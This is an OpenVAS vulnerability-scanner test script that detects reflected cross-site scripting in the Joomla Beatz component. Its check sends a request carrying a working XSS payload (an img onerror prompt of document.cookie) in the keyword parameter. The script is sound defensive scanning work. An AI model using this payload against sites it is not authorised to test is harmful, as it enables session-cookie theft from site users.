##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_joomla_beatz_com_mult_xss_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Joomla! 'Beatz' Component Multiple Cross Site Scripting Vulnerabilities
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the
  context of an affected site.
  Impact Level: Application";
tag_affected = "Joomla! Beatz Component";
tag_insight = "The flaws are due to improper validation of user-supplied inputs
  passed via the 'do', 'keyword', and 'video_keyword' parameters to the
  'index.php', which allows attackers to execute arbitrary HTML and script
  code in the context of an affected application or site.";
tag_solution = "No solution or patch is available as of 25th April, 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://extensions.joomla.org/extensions/";
tag_summary = "This host is running Joomla Beatz component and is prone to
  multiple cross site scripting vulnerabilities.";

if(description)
{
  script_id(902671);
  script_version("$Revision: 12 $");
  script_bugtraq_id(53030);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-04-25 17:38:13 +0530 (Wed, 25 Apr 2012)");
  script_name("Joomla! 'Beatz' Component Multiple Cross Site Scripting Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/81195");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/53030");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/74912");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/522361");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/111896/joomlabeatz-xss.txt");

  script_description(desc);
  script_summary("Check if Joomla Beatz component is vulnerable to XSS");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 SecPod");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("joomla/installed");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

## Variable Initialization
joomlaPort = 0;
joomlaDir = "";
url = "";

## Get HTTP Port
joomlaPort = get_http_port(default:80);
if(!joomlaPort){
  exit(0);
}

## Get the application directory
if(!joomlaDir = get_dir_from_kb(port:joomlaPort, app:"joomla")){
  exit(0);
}

## Construct attack request
url = '/beatz/index.php?do=listAll&keyword=++Search"><img+src=' +
      '0+onerror=prompt(document.cookie)>&option=com_find';

## Check the response to confirm vulnerability
if(http_vuln_check(port:joomlaPort, url:url, check_header:TRUE,
   pattern:"onerror=prompt\(document.cookie\)>", extra_check:"BeatzHeader")){
  security_warning(joomlaPort);
}
